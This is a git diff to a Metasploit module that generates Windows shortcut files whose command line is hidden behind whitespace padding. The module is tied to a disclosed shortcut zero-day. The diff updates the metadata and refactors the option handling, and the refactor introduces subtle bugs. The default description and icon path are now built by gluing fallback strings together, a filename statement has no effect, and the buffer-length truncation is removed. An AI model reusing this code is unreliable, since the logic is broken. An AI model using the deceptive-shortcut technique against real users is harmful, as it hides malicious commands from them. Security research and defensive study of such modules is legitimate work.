@@ -21,7 +21,7 @@ class MetasploitModule < Msf::Auxiliary
         'License' => MSF_LICENSE,
         'Author' => [ 'Nafiez' ],
         'References' => [
-          ['ZDI', 'CAN-25373'],
+          ['ZDI', '25-148'],
           ['URL', 'https://zeifan.my/Windows-LNK/'],
           ['URL', 'https://gist.github.com/nafiez/1236cc4c808a489e60e2927e0407c8d1'],
           ['URL', 'https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html']
@@ -30,16 +30,15 @@ class MetasploitModule < Msf::Auxiliary
         'Targets' => [ [ 'Windows', {} ] ],
         'DefaultTarget' => 0,
         'Notes' => {
-          'Stability' => [],
+          'Stability' => [CRASH_SAFE],
           'Reliability' => [],
-          'SideEffects' => []
+          'SideEffects' => [ARTIFACTS_ON_DISK]
         },
         'DisclosureDate' => '2025-07-19'
       )
     )
 
     register_options([
-      OptString.new('FILENAME', [ true, 'The LNK filename to generate', 'poc.lnk' ]),
       OptString.new('COMMAND', [ true, 'Command to execute', 'C:\\Windows\\System32\\calc.exe' ]),
       OptString.new('DESCRIPTION', [ false, 'LNK file description', nil ]),
       OptString.new('ICON_PATH', [ false, 'Icon path for the LNK file', nil]),
@@ -48,32 +47,23 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    filename = datastore['FILENAME']
+    datastore['FILENAME']
     command = datastore['COMMAND']
     description = datastore['DESCRIPTION']
     icon_path = datastore['ICON_PATH']
 
-    unless description && !description.empty?
-      description = Faker::Lorem.sentence(word_count: 3)
-      description ||= 'Shortcut'
-    end
-
-    unless icon_path && !icon_path.empty?
-      icon_path = File.join('%SystemRoot%\\System32', Faker::File.file_name(ext: 'icon').to_s)
-      icon_path ||= '%SystemRoot%\\System32\\shell32.dll'
-    end
+    description = "#{Faker::Lorem.sentence(word_count: 3)}Shortcut" if description.blank?
+    icon_path = "%SystemRoot%\\System32\\#{Faker::File.file_name(ext: 'icon')}%SystemRoot%\\System32\\shell32.dll" if icon_path.blank?
 
     buffer_size = datastore['BUFFER_SIZE']
 
-    print_status("Generating LNK file: #{filename}")
-
     lnk_data = generate_lnk_file(command, description, icon_path, buffer_size)
 
-    file_create(lnk_data)
+    filename = file_create(lnk_data)
 
-    print_good("Successfully created #{filename}")
-    print_status("Command line buffer size: #{buffer_size} bytes")
-    print_status("Target command: #{command}")
+    print_good("successfully created #{filename}")
+    print_status("command line buffer size: #{buffer_size} bytes")
+    print_status("target command: #{command}")
   end
 
   private
@@ -137,7 +127,6 @@ class MetasploitModule < Msf::Auxiliary
 
     buffer = ' ' * fill_bytes + cmd_command
 
-    buffer = buffer[0, buffer_size] if buffer.length > buffer_size
     buffer << "\x00"
 
     buffer
